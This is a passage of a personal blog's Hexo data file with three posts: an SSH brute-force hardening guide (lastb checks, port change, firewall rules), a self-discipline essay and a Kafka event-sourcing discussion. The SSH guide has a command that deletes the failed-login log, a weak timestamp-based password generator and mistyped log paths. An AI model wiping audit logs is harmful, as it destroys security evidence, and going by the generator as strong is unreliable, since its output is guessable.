bitcoin mining scripts on your machine a year ago. </p>\n<h2 id=\"Intro\"><a href=\"#Intro\" class=\"headerlink\" title=\"Intro.\"></a>Intro.</h2><p>Try this command to watch the login record:</p>\n<pre><code>du -sh `ls /var/log | grep btmp\n</code></pre><p>This file storage the login fail record of ssh. The larger size of the file, the more dangerous your server is undering. This is a simple and old cracking method, but still efficient.</p>\n<p>Larger part of the server use weak password, which using <code>root</code> as login username, password is sucession number and still using <code>22</code> as default login port. </p>\n<h2 id=\"Check-More-Record\"><a href=\"#Check-More-Record\" class=\"headerlink\" title=\"Check More Record\"></a>Check More Record</h2><ul>\n<li><code>/var/log/wtmp</code> is used for record sucessful login information. This is a binary format file. Only using <code>last</code> command is able to check its contents.</li>\n</ul>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">root     pts/0        *.*.*.*    Sat Feb 16 12:29   still logged in</span><br><span class=\"line\">root     pts/0        *.*.*.*   Fri Feb 15 20:42 - 20:55  (00:12)</span><br><span class=\"line\">root     pts/0        *.*.*.*   Thu Feb 14 13:27 - 18:55  (05:27)</span><br><span class=\"line\">root     pts/0        *.*.*.*    Wed Feb 13 21:31 - 23:07  (01:36)</span><br></pre></td></tr></table></figure>\n<p>Check the top 10 malvolence login IP:</p>\n<pre><code>sudo lastb | awk &apos;{ print $3}&apos; | awk &apos;{++S[$NF]} END {for(a in S) print a, S[a]}&apos; | sort -rk2 |head\n</code></pre><p>Check the times of malvolence login time:</p>\n<pre><code>lastb | awk &apos;{ print $3}&apos; | sort | uniq -c | sort -n\n</code></pre><p>If you want to clear this log:</p>\n<pre><code>rm -rf /var/log/btmp\ntouch /var/log/btmp\n</code></pre><ul>\n<li><p><code>/var/log/btmp</code> is used to record the failed login IP. Using <code>lastb</code> to check its content. </p>\n</li>\n<li><p><code>/var/login/lastlog</code> is used to record user login history. Using <code>lastlog</code></p>\n</li>\n<li><p><code>/var/login/utmp</code> is used to record current user information. Using <code>who</code></p>\n</li>\n</ul>\n<h2 id=\"SSH\"><a href=\"#SSH\" class=\"headerlink\" title=\"SSH\"></a>SSH</h2><ul>\n<li><p>change <code>ssh</code> default port</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">vi /etc/ssh/sshd_config</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>restart <code>sshd</code> service </p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">systemctl restart sshd</span><br><span class=\"line\">systemctl status sshd</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>add <code>iptables</code></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># iptables config file location: /etc/sysconfig/iptables</span><br><span class=\"line\">iptables -A INPUT -m state --state NEW -m tcp -p tcp --dport 1000 -j ACCEPT</span><br><span class=\"line\"># add 1000 port rule</span><br><span class=\"line\">service iptables save</span><br><span class=\"line\">service iptables restart</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>or using <code>firewall-cmd</code></p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">firewall-cmd --state</span><br><span class=\"line\"></span><br><span class=\"line\">systemctl start firewalld</span><br><span class=\"line\">systemctl enable firewalld</span><br><span class=\"line\"></span><br><span class=\"line\"># check default/active zone </span><br><span class=\"line\">firewall-cmd --get-default-zone</span><br><span class=\"line\">firewall-cmd --get-active-zones</span><br><span class=\"line\"># open port</span><br><span class=\"line\">firewall-cmd --permanent --zone=public --add-port=22/tcp</span><br><span class=\"line\">firewall-cmd --permanent --zone=public --add-port=1000/tcp</span><br><span class=\"line\"># reload firewall </span><br><span class=\"line\">firewall-cmd --reload </span><br><span class=\"line\"></span><br><span class=\"line\"># check exposed port </span><br><span class=\"line\">firewall-cmd --permanent --list-port </span><br><span class=\"line\">firewall-cmd --zone=public --list-all</span><br></pre></td></tr></table></figure>\n</li>\n</ul>\n<h2 id=\"Using-strong-password\"><a href=\"#Using-strong-password\" class=\"headerlink\" title=\"Using strong password\"></a>Using strong password</h2><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">passwd</span><br></pre></td></tr></table></figure>\n<p>randdom password generator</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"># echo $(getRandomPwd 10)</span><br><span class=\"line\"># echo $(getRandomPwd)</span><br><span class=\"line\">getRandomPwd()&#123;</span><br><span class=\"line\">    num=32</span><br><span class=\"line\">    if [ $# == 1 ];then</span><br><span class=\"line\">        num=$1</span><br><span class=\"line\">    fi</span><br><span class=\"line\">    echo &quot;$(date +%s)$(shuf -i 10000-65536 -n 1)&quot; | sha256sum | base64 | head -c $num ; echo</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n"},{"title":"The odyssey of Self-Discipline","cover_img":"https://i.loli.net/2019/02/13/5c643027a5b02.png","date":"2016-12-30T17:10:15.000Z","_content":"## Why I am so hard to stay disciplined?\n\nI'd known I am one of the ADHDer(not so heavy, but just always losing my focus). The worst side of the influence is not the symptom (never ever) but the untangible mind which unconciously affect my behavior. I learned a word -- preconception and suddenly be enlightened.\n\nI should be more self discipline and be more confident about my mind. \n\nBut why it is still so hard to stay disciplined?\n\n> Because we allow our mind to interface the path of discipline. Why do we fail to get in the early morning? Because the mind says, \"You are so tired and sleep deprived. Just sleep for 5 minute more and it will be fine\". Then % becomes 10, and it is all the way downhill after that.\n\nWe allow the fallacy that we will get up early or eat healthy or study well or do the right thing when we **get used to it and it becomes a little easier**. \n\nBut it will NEVER get easier. It will never be easy to get up at 5 am, every single day of the year. Not now, not after 10 years. \n\n## What should I do?\nThe answer maybe trivially simple, but also very hard. I must stop listening to my mind. Just stop. No concession to what my mind says.\n\nWhen I have to do something hard, I have to become a robot. It does not matter how I feel. Who cares? It does not matter how this thing will get well. Becuase it is a training, not just a task. I must get used to it and improve the way I used for handling stuff. At first, I just execute like the plan like a machine. \n\nThen I decide to go for a run, get up and run. I feel groggy and my legs hurt. The pain I feel is exactly the pain everybody else feels. The pain of discipline is the price of happiness. \n\n\n### People who win are those who keep going, regardless of how much it hurts.\n\n","source":"_posts/The-odyssey-of-Self-Discipline.md","raw":"---\n# layout: title\ntitle: The odyssey of Self-Discipline\ncover_img: https://i.loli.net/2019/02/13/5c643027a5b02.png\ndate: 2016-12-30 11:10:15\ntags: methdology\ncategories: Lifestyle\n---\n## Why I am so hard to stay disciplined?\n\nI'd known I am one of the ADHDer(not so heavy, but just always losing my focus). The worst side of the influence is not the symptom (never ever) but the untangible mind which unconciously affect my behavior. I learned a word -- preconception and suddenly be enlightened.\n\nI should be more self discipline and be more confident about my mind. \n\nBut why it is still so hard to stay disciplined?\n\n> Because we allow our mind to interface the path of discipline. Why do we fail to get in the early morning? Because the mind says, \"You are so tired and sleep deprived. Just sleep for 5 minute more and it will be fine\". Then % becomes 10, and it is all the way downhill after that.\n\nWe allow the fallacy that we will get up early or eat healthy or study well or do the right thing when we **get used to it and it becomes a little easier**. \n\nBut it will NEVER get easier. It will never be easy to get up at 5 am, every single day of the year. Not now, not after 10 years. \n\n## What should I do?\nThe answer maybe trivially simple, but also very hard. I must stop listening to my mind. Just stop. No concession to what my mind says.\n\nWhen I have to do something hard, I have to become a robot. It does not matter how I feel. Who cares? It does not matter how this thing will get well. Becuase it is a training, not just a task. I must get used to it and improve the way I used for handling stuff. At first, I just execute like the plan like a machine. \n\nThen I decide to go for a run, get up and run. I feel groggy and my legs hurt. The pain I feel is exactly the pain everybody else feels. The pain of discipline is the price of happiness. \n\n\n### People who win are those who keep going, regardless of how much it hurts.\n\n","slug":"The-odyssey-of-Self-Discipline","published":1,"updated":"2019-03-11T04:32:07.134Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckkljsarw0007r2428u6zrj6q","content":"<h2 id=\"Why-I-am-so-hard-to-stay-disciplined\"><a href=\"#Why-I-am-so-hard-to-stay-disciplined\" class=\"headerlink\" title=\"Why I am so hard to stay disciplined?\"></a>Why I am so hard to stay disciplined?</h2><p>I’d known I am one of the ADHDer(not so heavy, but just always losing my focus). The worst side of the influence is not the symptom (never ever) but the untangible mind which unconciously affect my behavior. I learned a word – preconception and suddenly be enlightened.</p>\n<p>I should be more self discipline and be more confident about my mind. </p>\n<p>But why it is still so hard to stay disciplined?</p>\n<blockquote>\n<p>Because we allow our mind to interface the path of discipline. Why do we fail to get in the early morning? Because the mind says, “You are so tired and sleep deprived. Just sleep for 5 minute more and it will be fine”. Then % becomes 10, and it is all the way downhill after that.</p>\n</blockquote>\n<p>We allow the fallacy that we will get up early or eat healthy or study well or do the right thing when we <strong>get used to it and it becomes a little easier</strong>. </p>\n<p>But it will NEVER get easier. It will never be easy to get up at 5 am, every single day of the year. Not now, not after 10 years. </p>\n<h2 id=\"What-should-I-do\"><a href=\"#What-should-I-do\" class=\"headerlink\" title=\"What should I do?\"></a>What should I do?</h2><p>The answer maybe trivially simple, but also very hard. I must stop listening to my mind. Just stop. No concession to what my mind says.</p>\n<p>When I have to do something hard, I have to become a robot. It does not matter how I feel. Who cares? It does not matter how this thing will get well. Becuase it is a training, not just a task. I must get used to it and improve the way I used for handling stuff. At first, I just execute like the plan like a machine. </p>\n<p>Then I decide to go for a run, get up and run. I feel groggy and my legs hurt. The pain I feel is exactly the pain everybody else feels. The pain of discipline is the price of happiness. </p>\n<h3 id=\"People-who-win-are-those-who-keep-going-regardless-of-how-much-it-hurts\"><a href=\"#People-who-win-are-those-who-keep-going-regardless-of-how-much-it-hurts\" class=\"headerlink\" title=\"People who win are those who keep going, regardless of how much it hurts.\"></a>People who win are those who keep going, regardless of how much it hurts.</h3>","site":{"data":{}},"excerpt":"","more":"<h2 id=\"Why-I-am-so-hard-to-stay-disciplined\"><a href=\"#Why-I-am-so-hard-to-stay-disciplined\" class=\"headerlink\" title=\"Why I am so hard to stay disciplined?\"></a>Why I am so hard to stay disciplined?</h2><p>I’d known I am one of the ADHDer(not so heavy, but just always losing my focus). The worst side of the influence is not the symptom (never ever) but the untangible mind which unconciously affect my behavior. I learned a word – preconception and suddenly be enlightened.</p>\n<p>I should be more self discipline and be more confident about my mind. </p>\n<p>But why it is still so hard to stay disciplined?</p>\n<blockquote>\n<p>Because we allow our mind to interface the path of discipline. Why do we fail to get in the early morning? Because the mind says, “You are so tired and sleep deprived. Just sleep for 5 minute more and it will be fine”. Then % becomes 10, and it is all the way downhill after that.</p>\n</blockquote>\n<p>We allow the fallacy that we will get up early or eat healthy or study well or do the right thing when we <strong>get used to it and it becomes a little easier</strong>. </p>\n<p>But it will NEVER get easier. It will never be easy to get up at 5 am, every single day of the year. Not now, not after 10 years. </p>\n<h2 id=\"What-should-I-do\"><a href=\"#What-should-I-do\" class=\"headerlink\" title=\"What should I do?\"></a>What should I do?</h2><p>The answer maybe trivially simple, but also very hard. I must stop listening to my mind. Just stop. No concession to what my mind says.</p>\n<p>When I have to do something hard, I have to become a robot. It does not matter how I feel. Who cares? It does not matter how this thing will get well. Becuase it is a training, not just a task. I must get used to it and improve the way I used for handling stuff. At first, I just execute like the plan like a machine. </p>\n<p>Then I decide to go for a run, get up and run. I feel groggy and my legs hurt. The pain I feel is exactly the pain everybody else feels. The pain of discipline is the price of happiness. </p>\n<h3 id=\"People-who-win-are-those-who-keep-going-regardless-of-how-much-it-hurts\"><a href=\"#People-who-win-are-those-who-keep-going-regardless-of-how-much-it-hurts\" class=\"headerlink\" title=\"People who win are those who keep going, regardless of how much it hurts.\"></a>People who win are those who keep going, regardless of how much it hurts.</h3>"},{"layout":"title","title":"Using Kafka as a Event Store","date":"2019-02-10T22:11:12.000Z","_content":"Kafka is meant to be a messaging system which has many similarities to an event store however to quote their intro:\n\n> The Kafka cluster retains all published messages—whether or not they\n> have been consumed—**for a configurable period of time**. For example if\n> the retention is set for two days, then for the two days after a\n> message is published it is available for consumption, after which it\n> will be discarded to free up space. Kafka's performance is effectively\n> constant with respect to data size so retaining lots of data is not a\n> problem.\n\nSo while messages can potentially be retained indefinitely, the expectation is that they will be deleted. This doesn't mean you can't use this as an event store, but it may be better to use something else. Take a look at [EventStore][1] for an alternative.\n\n[Kafka documentation](http://kafka.apache.org/documentation.html):\n\n> Event sourcing is a style of application design where state changes are logged as a time-ordered sequence of records. Kafka's support for very large stored log data makes it an excellent backend for an application built in this style.\n\nOne concern with using Kafka for event sourcing is the number of required topics. Typically in event sourcing, there is a stream (topic) of events per entity (such as user, product, etc). This way, the current state of an entity can be reconstituted by re-applying all events in the stream. Each Kafka topic consists of one or more partitions and each partition is stored as a directory on the file system. There will also be pressure from ZooKeeper as the number of znodes increases.\n\nOther things that we should notice are:\n\n - Kafka only guarantees at least once deliver and there are duplicates\n   in the event store that cannot be removed. \n   Here you can read why it is so hard with Kafka and some latest news about how to finally achieve this behavior: https://www.confluent.io/blog/exactly-once-semantics-are-possible-heres-how-apache-kafka-does-it/\n - Due to immutability, there is no way to manipulate event store when application evolves and events need to be transformed (there are of course methods like upcasting, but...). Once might say you never need to transform events, but that is not correct assumption, there could be situation where you do backup of original, but you upgrade them to latest versions. That is valid requirement in event driven architectures.\n - No place to persist snapshots of entities/aggregates and replay will become slower and slower. Creating snapshots is must feature for event store from long term perspective. \n - Given Kafka partitions are distributed and they are hard to manage and\n   backup compare with databases. Databases are simply simpler\n\nSo, before you make your choice you think twice. Event store as combination of application layer interfaces (monitoring and management), SQL/NoSQL store and Kafka as broker is better choice than leaving Kafka handle both roles to create complete feature full solution.\n\nEvent store is complex service which requires more than what Kafka can offer if you are serious about applying Event sourcing, CQRS, Sagas and other patterns in event driven architecture and stay high performance.\n\nPlease look at eventuate.io microservices open source framework to discover more about the potential problems: http://eventuate.io/\n\n### Back to Topic\n- Using Kafka as a event soursing? Yes or No, depending on your event sourcing usage.\n- It can be used in downstream event processors\nIn this kind of system, events happen in the real world and are recorded as facts. Such as a warehouse system to keep track of pallets of products. There are basically no conflicting events. Everything has already happened, even if it was wrong. (I.e. pallet 123456 put on truck A, but was scheduled for truck B.) Then later the facts are checked for exceptions via reporting mechanisms. Kafka seems well-suited for this kind of down-stream, event processing application.\n\nIn this context, it is understandable why Kafka folks are advocating it as an Event Sourcing solution. Because it is quite similar to how it is already used in, for example, click streams. However, people using the term Event Sourcing (as opposed to Stream Processing) are likely referring to the second usage...\n- It CANNOT be used in Application-controlled source of truth\n\nThis kind of application declares its own events as a result of user requests passing through business logic. Kafka does not work well in this case for two primary reasons.\n+ Lack of entity isolation\n\nThis scenario needs the ability to load the event stream for a specific entity. The common reason for this is to build a transient write model for the business logic to use to process the request. Doing this is impractical in Kafka. Using topic-per-entity could allow this, except this is a non-starter when there may be thousands or millions of that entity. This is due to technical limits in Kafka/Zookeeper. Using topic-per-type is recommended instead for Kafka, but this would require loading events for every entity of that type just to get events for a single entity. Since you cannot tell by log position which events belong to which entity. Even using Snapshots to start from a known log position, this could be a significant number of events to churn through. But snapshots cannot help you with code changes. Because adding new features to the business logic may render previous snapshots structurally incompatible. So it is still necessary to do a topic replay in those cases to build a new model. One of the main reasons to use a transient write model instead of a persisted one is to make business logic changes cheap and easy to deploy.\n\n+ Lack of conflict detection\n\nSecondly, users can create race conditions due to concurrent requests against the same entity. It may be quite undesirable to save conflicting events and resolve them after the fact. So it is important to be able to prevent conflicting events. To scale request load, it is common to use stateless services while preventing write conflicts using conditional writes (only write if the last entity event was #x). A.k.a. Optimistic Concurrency. Kafka does not support optimistic concurrency. Even if it supported it at the topic level, it would need to be all the way down to the entity level to be effective. To use Kafka and prevent conflicting events, you would need to use a stateful, serialized writer at the application level. This is a significant architectural requirement/restriction.\n\n  [1]: http://geteventstore.com/","source":"_posts/Using-Kafka-as-a-Event-Store.md","raw":"---\nlayout: title\ntitle: Using Kafka as a Event Store\ndate: 2019-02-10 16:11:12\ntags: distributed System\ncategories: Tech\n---\nKafka is meant to be a messaging system which has many similarities to an event store however to quote their intro:\n\n> The Kafka cluster retains all published messages—whether or not they\n> have been consumed—**for a configurable period of time**. For example if\n> the retention is set for two days, then for the two days after a\n> message is published it is available for consumption, after which it\n> will be discarded to free up space. Kafka's performance is effectively\n> constant with respect to data size so retaining lots of data is not a\n> problem.\n\nSo while messages can potentially be retained indefinitely, the expectation is that they will be deleted. This doesn't mean you can't use this as an event store, but it may be better to use something else. Take a look at [EventStore][1] for an alternative.\n\n[Kafka documentation](http://kafka.apache.org/documentation.html):\n\n> Event sourcing is a style of application design where state changes are logged as a time-ordered sequence of records. Kafka's support for very large stored log data makes it an excellent backend for an application built in this style.\n\nOne concern with using Kafka for event sourcing is the number of required topics. Typically in event sourcing, there is a stream (topic) of events per entity (such as user, product, etc). This way, the current state of an entity can be reconstituted by re-applying all events in the stream. Each Kafka topic consists of one or more partitions and each partition is stored as a directory on the file system. There will also be pressure from ZooKeeper as the number of znodes increases.\n\nOther things that we should notice are:\n\n - Kafka only guarantees at least once deliver and there are duplicates\n   in the event store that cannot be removed. \n   Here you can read why it is so hard with Kafka and some latest news about how to finally achieve this behavior: https://www.confluent.io/blog/exactly-once-semantics-are-possible-heres-how-apache-kafka-does-it/\n - Due to immutability, there is no way to manipulate event store when application evolves and events need to be transformed (there are of course methods like upcasting, but...). Once might say you never need to transform events, but that is not correct assumption, there could be situation where you do backup of original, but you upgrade them to latest versions. That is valid requirement in event driven architectures.\n - No place to persist snapshots of entities/aggregates and replay will become slower and slower. Creating snapshots is must feature for event store from long term perspective. \n - Given Kafka partitions are distributed and they are hard to manage and\n   backup compare with databases. Databases are simply simpler\n\nSo, before you make your choice you think twice. Event store as combination of application layer interfaces (monitoring and management), SQL/NoSQL store and Kafka as broker is better choice than leaving Kafka handle both roles to create complete feature full solution.\n\nEvent store is complex service which requires more than what Kafka can offer if you are serious about applying Event sourcing, CQRS, Sagas and other patterns in event driven architecture and stay high performance.\n\nPlease look at eventuate.io microservices open source framework to discover more about the potential problems: http://eventuate.io/\n\n### Back to Topic\n- Using Kafka as a event soursing? Yes or No, depending on your event sourcing usage.\n- It can be used in downstream event processors\nIn this kind of system, events happen in the real world and are recorded as facts. Such as a warehouse system to keep track of pallets of products. There are basically no conflicting events. Everything has already happened, even if it was wrong. (I.e. pallet 123456 put on truck A, but was scheduled for truck B.) Then later the facts are checked for exceptions via reporting mechanisms. Kafka seems well-suited for this kind of down-stream, event processing application.\n\nIn this context, it is understandable why Kafka folks are advocating it as an Event Sourcing solution. Because it is quite similar to how it is already used in, for example, click streams. However, people using the term Event Sourcing (as opposed to Stream Processing) are likely referring to the second usage...\n- It CANNOT be used in Application-controlled source of truth\n\nThis kind of application declares its own events as a result of user requests passing through business logic. Kafka does not work well in this case for two primary reasons.\n+ Lack of entity isolation\n\nThis scenario needs the ability to load the event stream for a specific entity. The common reason for this is to build a transient write model for the business logic to use to process the request. Doing this is impractical in Kafka. Using topic-per-entity could allow this, except this is a non-starter when there may be thousands or millions of that entity. This is due to technical limits in Kafka/Zookeeper. Using topic-per-type is recommended instead for Kafka, but this would require loading events for every entity of that type just to get events for a single entity. Since you cannot tell by log position which events belong to which entity. Even using Snapshots to start from a known log position, this could be a significant number of events to churn through. But snapshots cannot help you with code changes. Because adding new features to the business logic may render previous snapshots structurally incompatible. So it is still necessary to do a topic replay in those cases to build a new model. One of the main reasons to use a transient write model instead of a persisted one is to make business logic changes cheap and easy to deploy.\n\n+ Lack of conflict detection\n\nSecondly, users can create race conditions due to concurrent requests against the same entity. It may be quite undesirable to save conflicting events and resolve them after the fact. So it is important to be able to prevent conflicting events. To scale request load, it is common to use stateless services while preventing write conflicts using conditional writes (only write if the last entity event was #x). A.k.a. Optimistic Concurrency. Kafka does not support optimistic concurrency. Even if it supported it at the topic level, it would need to be all the way down to the entity level to be effective. To use Kafka and prevent conflicting events, you would need to use a stateful, serialized writer at the application level. This is a significant architectural requirement/restriction.\n\n  [1]: http://geteventstore.com/","slug":"Using-Kafka-as-a-Event-Store","published":1,"updated":"2019-02-13T13:58:45.561Z","comments":1,"photos":[],"link":"","_id":"ckkljsas0000br242mm97zowg","content":"<p>Kafka is meant to be a messaging system which has many similarities to an event store however to quote their intro:</p>\n<blockquote>\n<p>The Kafka cluster retains all published messages—whether or not they<br>have been consumed—<strong>for a configurable period of time</strong>. For example if<br>the retention is set for two days, then for the two days after a<br>message is published it is available for consumption, after which it<br>will be discarded to free up space. Kafka’s performance is effectively<br>constant with respect to data size so retaining lots of data is not a<br>problem.</p>\n</blockquote>\n<p>So while messages can potentially be retained indefinitely, the expectation is that they will be deleted. This doesn’t mean you can’t use this as an event store, but it may be better to use something else. Take a look at <a href=\"http://geteventstore.com/\" target=\"_blank\" rel=\"external\">EventStore</a> for an alternative.</p>\n<p><a href=\"http://kafka.apache.org/documentation.html\" target=\"_blank\" rel=\"external\">Kafka documentation</a>:</p>\n<blockquote>\n<p>Event sourcing is a style of application design where state changes are logged as a time-ordered sequence of records. Kafka’s support for very large stored log data makes it an excellent backend for an application built in this style.</p>\n</blockquote>\n<p>One concern with using Kafka for event sourcing is the number of required topics. Typically in event sourcing, there is a stream (topic) of events per entity (such as user, product, etc). This way, the current state of an entity can be reconstituted by re-applying all events in the stream. Each Kafka topic consists of one or more partitions and each partition is stored as a directory on the file system. There will also be pressure from ZooKeeper as the number of znodes increases.</p>\n<p>Other things that we should notice are:</p>\n<ul>\n<li>Kafka only guarantees at least once deliver and there are duplicates<br>in the event store that cannot be removed.<br>Here you can read why it is so hard with Kafka and some latest news about how to finally achieve this behavior: <a href=\"https://www.confluent.io/blog/exactly-once-semantics-are-possible-heres-how-apache-kafka-does-it/\" target=\"_blank\" rel=\"external\">https://www.confluent.io/blog/exactly-once-semantics-are-possible-heres-how-apache-kafka-does-it/</a></li>\n<li>Due to immutability, there is no way to manipulate event store when application evolves and events need to be transformed (there are of course methods like upcasting, but…). Once might say you never need to transform events, but that is not correct assumption, there could be situation where you do backup of original, but you upgrade them to latest versions. That is valid requirement in event driven architectures.</li>\n<li>No place to persist snapshots of entities/aggregates and replay will become slower and slower. Creating snapshots is must feature for event store from long term perspective. </li>\n<li>Given Kafka partitions are distributed and they are hard to manage and<br>backup compare with databases. Databases are simply simpler</li>\n</ul>\n<p>So, before you make your choice you think twice. Event store as combination of application layer interfaces (monitoring and management), SQL/NoSQL store and Kafka as broker is better choice than leaving Kafka handle both roles to create complete feature full solution.</p>\n<p>Event store is complex service which requires more than what Kafka can offer if you are serious about applying Event sourcing, CQRS, Sagas and other patterns in event driven architecture and stay high performance.</p>\n<p>Please look at eventuate.io microservices open source framework to discover more about the potential problems: <a href=\"http://eventuate.io/\" target=\"_blank\" rel=\"external\">http://eventuate.io/</a></p>\n<h3 id=\"Back-to-Topic\"><a href=\"#Back-to-Topic\" class=\"headerlink\" title=\"Back to Topic\"></a>Back to Topic</h3><ul>\n<li>Using Kafka as a event soursing? Yes or No, depending on your event sourcing usage.</li>\n<li>It can be used in downstream event processors<br>In this kind of system, events happen in the real world and are recorded as facts. Such as a warehouse system to keep track of pallets of products. There are basically no conflicting events. Everything has already happened, even if it was wrong. (I.e. pallet 123456 put on truck A, but was scheduled for truck B.) Then later the facts are checked for exceptions via reporting mechanisms. Kafka seems well-suited for this kind of down-stream, event processing application.</li>\n</ul>\n<p>In this context, it is understandable why Kafka folks are advocating it as an Event Sourcing solution. Because it is quite similar to how it is already used in, for example, click streams. However, people using the term Event Sourcing (as opposed to Stream Processing) are likely referring to the second usage…</p>\n<ul>\n<li>It CANNOT be used in Application-controlled source of truth</li>\n</ul>\n<p>This kind of application declares its own events as a result of user requests passing through business logic. Kafka does not work well in this case for two primary reasons.</p>\n<ul>\n<li>Lack of entity isolation</li>\n</ul>\n<p>This scenario needs the ability to load the event stream for a specific entity. The common reason for this is to build a transient write model for the business logic to use to process the request. Doing this is impractical in Kafka. Using topic-per-entity could allow this, except this is a non-starter when there may be thousands or millions of that entity. This is due to technical limits in Kafka/Zookeeper. Using topic-per-type is recommended instead for Kafka, but this would require loading events for every entity of that type just to get events for a single entity. Since you cannot tell by log position which events belong to which entity. Even using Snapshots to start from a known log position, this could be a significant number of events to churn through. But snapshots cannot help you with code changes. Because adding new features to the business logic may render previous snapshots structurally incompatible. So it is still necessary to do a topic replay in those cases to build a new model. One of the main reasons to use a transient write model instead of a persisted one is to make business logic changes cheap and easy to deploy.</p>\n<ul>\n<li>Lack of conflict detection</li>\n</ul>\n<p>Secondly, users can create race conditions due to concurrent requests against the same entity. It may be quite undesirable to save conflicting events and resolve them after the fact. So it is important to be able to prevent conflicting events. To scale request load, it is common to use stateless services while preventing write conflicts using conditional writes (only write if the last entity event was #x). A.k.a. Optimistic Concurrency. Kafka does not support optimistic concurrency. Even if it supported it at the topic level, it would need to be all the way down to the entity level to be effective. To use Kafka and prevent conflicting events, you would need to use a stateful, serialized writer at the application level. This is a significant architectural requirement/restriction.</p>\n","site":{"data":{}},"excerpt":"","more":"<p>Kafka is meant to be a messaging system which has many similarities to an event store however to quote their intro:</p>\n<blockquote>\n<p>The Kafka cluster retains all published messages—whether or not they<br>have been consumed—<strong>for a configurable period of time</strong>. For example if<br>the retention is set for two days, then for the two days after a<br>message is published it is available for consumption, after which it<br>will be discarded to free up space. Kafka’s performance is effectively<br>constant with respect to data size so retaining lots of data is not a<br>problem.</p>\n</blockquote>\n<p>So while messages can potentially be retained indefinitely, the expectation is that they will be deleted. This doesn’t mean you can’t use this as an event store, but it may be better to use something else. Take a look at <a href=\"http://geteventstore.com/\">EventStore</a> for an alternative.</p>\n<p><a href=\"http://kafka.apache.org/documentation.html\">Kafka documentation</a>:</p>\n<blockquote>\n<p>Event sourcing is a style of application design where state changes are logged as a time-ordered sequence of records. Kafka’s support for very large stored log data makes it an excellent backend for an application built in this style.</p>\n</blockquote>\n<p>One concern with using Kafka for event sourcing is the number of required topics. Typically in event sourcing, there is a stream (topic) of events per entity (such as user, product, etc). This way, the current state of an entity can be reconstituted by re-applying all events in the stream. Each Kafka topic consists of one or more partitions and each partition is stored as a directory on the file system. There will also be pressure from ZooKeeper as the number of znodes increases.</p>\n<p>Other things that we should notice are:</p>\n<ul>\n<li>Kafka only guarantees at least once deliver and there are duplicates<br>in the event store that cannot be removed.<br>Here you can read why it is so hard with Kafka and some latest news about how to finally achieve this behavior: <a href=\"https://www.confluent.io/blog/exactly-once-semantics-are-possible-heres-how-apache-kafka-does-it/\">https://www.confluent.io/blog/exactly-once-semantics-are-possible-heres-how-apache-kafka-does-it/</a></li>\n<li>Due to immutability, there is no way to manipulate event store when application evolves and events need to be transformed (there are of course methods like upcasting, but…). Once might say you never need to transform events, but that is not correct assumption, there could be situation where you do backup of original, but you upgrade them to latest versions. That is valid requirement in event driven architectures.</li>\n<li>No place to persist snapshots of entities/aggregates and replay will become slower and slower. Creating snapshots is must feature for event store from long term perspective. </li>\n<li>Given Kafka partitions are distributed and they are hard to manage and<br>backup compare with databases. Databases are simply simpler</li>\n</ul>\n<p>So, before you make your choice you think twice. Event store as combination of application layer interfaces (monitoring and management), SQL/NoSQL store and Kafka as broker is better choice than leaving Kafka handle both roles to create complete feature full solution.</p>\n<p>Event store is complex service which requires more than what Kafka can offer if you are serious about applying Event sourcing, CQRS, Sagas and other patterns in event driven architecture and stay high performance.</p>\n<p>Please look at eventuate.io microservices open source framework to discover more about the potential problems: <a href=\"http://eventuate.io/\">http://eventuate.io/</a></p>\n<h3 id=\"Back-to-Topic\"><a href=\"#Back-to-Topic\" class=\"headerlink\" title=\"Back to Topic\"></a>Back to Topic</h3><ul>\n<li>Using Kafka as a event soursing? Yes or No, depending on your event sourcing usage.</li>\n<li>It can be used in downstream event processors<br>In this kind of system, events happen in the real world and are recorded as facts. Such as a warehouse system to keep track of pallets of products. There are basically no conflicting events. Everything has already happened, even if it was wrong. (I.e. pallet 123456 put on truck A, but was scheduled for truck B.) Then later the facts are checked for exceptions via reporting mechanisms. Kafka seems well-suited for this kind of down-stream, event processing application.</li>\n</ul>\n<p>In this context, it is understandable why Kafka folks are advocating it as an Event Sourcing solution. Because it is quite similar to how it is already used in, for example, click streams. However, people using the term Event Sourcing (as opposed to Stream Processing) are likely referring to the second usage…</p>\n<ul>\n<li>It CANNOT be used in Application-controlled source of truth</li>\n</ul>\n<p>This kind of application declares its own events as a result of user requests passing through business logic. Kafka does not work well in this case for two primary reasons.</p>\n<ul>\n<li>Lack of entity isolation</li>\n</ul>\n<p>This scenario needs the 